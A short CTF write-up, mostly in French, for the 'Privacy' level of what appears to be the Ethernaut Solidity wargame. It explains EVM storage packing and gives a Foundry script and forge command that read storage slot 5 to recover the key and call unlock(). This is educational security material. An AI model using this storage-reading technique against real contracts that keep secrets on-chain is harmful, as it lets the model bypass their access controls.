
# Privacy Smart Contract


### Analyse et emballage des emplacements:

En examinant attentivement la documentation Solidity, j'ai découvert que les variables de taille statique (à l'exception des types de tableau dynamiques et de mappage) sont disposées de manière contiguë dans le stockage, à partir de la position 0. Plusieurs éléments nécessitant moins de 32 octets sont regroupés dans un seul emplacement de stockage si possible.

Cela signifie que chaque type de variable dans Solidity est stocké sur des emplacements de stockage et que chaque emplacement a une taille de 32 octets. Si une variable est plus petite que 32 octets, l'EVM essaie de regrouper plusieurs variables dans un seul emplacement pour optimiser le stockage.

### Exploitation de la fonction unlock():

La fonction unlock() s'est révélée être la clé du succès. Elle compare la valeur stockée dans data[2] (emplacement 5) à une clé bytes16 et désactive le verrouillage si elles correspondent.

Création de l'exploit:

Avec ces informations en main, j'ai élaboré un script astucieux pour exploiter le contrat :

Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../instances/instancePrivacy.sol";

contract POC is Script {

    Privacy level12 = Privacy(0xaDeD3F5a4bf3951994F75b2bf1F4b62C320223D6);

    function run() external{
        vm.startBroadcast();
        bytes32 myKey = vm.load(address(level12), bytes32(uint256(5)));
        level12.unlock(bytes16(myKey));
        vm.stopBroadcast();
    }

### Faire 
```bash
forge script ./script/Privacy.sol --private-key $PRIVATE_KEY --broadcast --rpc-url $INFURA_RPC_URL
```

#### The script will succeed and the instance can now be submitted to finish the level. The locked status can be queried by a call to the contract or by using your console await contract.locked() which will return false.



